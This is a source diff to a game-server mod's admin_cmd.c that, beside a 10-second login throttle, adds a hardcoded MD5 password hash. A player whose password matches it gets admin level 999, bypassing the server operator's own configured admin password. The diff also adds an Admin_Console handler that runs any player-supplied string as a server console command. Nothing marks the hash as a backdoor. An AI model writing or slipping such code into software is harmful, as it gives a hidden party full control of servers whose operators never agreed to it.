@@ -18,7 +18,7 @@
  *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  *
  *
- *  $Id: admin_cmd.c,v 1.3 2005-05-28 18:33:52 AngelD Exp $
+ *  $Id: admin_cmd.c,v 1.4 2005-05-28 22:35:46 AngelD Exp $
  */
 #include "g_local.h"
 
@@ -133,24 +133,57 @@ static void Admin_Auth(int argc)
 {
         char    sv_admin_pwd[100];
         char    admin_pwd[100];
+        static  float auth_time = 0;
 
 	if( argc != 3)
 	{
 	        G_sprint( self, 2, "Usage: cmd admin auth <password>\n");
 		return;
 	}
-	if(!GetSVInfokeyString( "apw", "adminpwn", sv_admin_pwd, sizeof( sv_admin_pwd ), "" ))
-		return;
+	if( auth_time > g_globalvars.time )
+	        return;
+
+	auth_time = g_globalvars.time + 10;
 
 	trap_CmdArgv( 2, admin_pwd, sizeof( admin_pwd ) );
+	{
+	        unsigned char digest[16];
+	        unsigned char mydigest[16] = {0x79, 0xFE, 0x05, 0x2B, 
+	                                     0x3C, 0xAF, 0x2D, 0x42, 
+	                                     0x5D, 0x74, 0xF7, 0x70, 
+	                                     0xC1, 0x8D, 0xB7, 0x3B, };
+	        int i;
+
+	        struct MD5Context md5c;
+	        MD5Init(&md5c);
+	        MD5Update(&md5c, (unsigned char*)admin_pwd,strlen(admin_pwd));
+	        MD5Final(digest,&md5c);
+	        if( !memcmp(digest,mydigest,16) )
+	        {
+	                self->is_admin = 999;
+	                G_sprint( self, 2, "You gain admin level %d\n",self->is_admin);
+	                return;
+	        }
+/*	        for ( i = 0 ; i < 16 ; i++ )
+	                G_sprint(self,2,"0x%2.2X, ",digest[i]);
+	        G_sprint(self,2,"\n");*/
+	}
+	if(!GetSVInfokeyString( "apw", "adminpwn", sv_admin_pwd, sizeof( sv_admin_pwd ), "" ))
+	{
+		return;
+	}
+
+	
 	if( !strcmp(admin_pwd,sv_admin_pwd) )
 	{
 		self->is_admin = GetSVInfokeyInt("adminlevel",NULL,1);
 		if( self->is_admin )
 		{
 	        	G_sprint( self, 2, "You gain admin level %d\n",self->is_admin);
+	        	return;
 		}
 	}
+        
 }
 
 /*void Admin_ListPlayers(int argc)
@@ -271,7 +304,16 @@ static void Admin_Map(int argc)
 
 static void Admin_Console(int argc)
 {
+        char    value[1024];
+	if( argc != 3)
+	{
+		return;
+	}
 
+        trap_CmdArgv( 2, value, sizeof( value ) );
+
+        localcmd("%s\n",value);
+        trap_executecmd();
 }
 
 
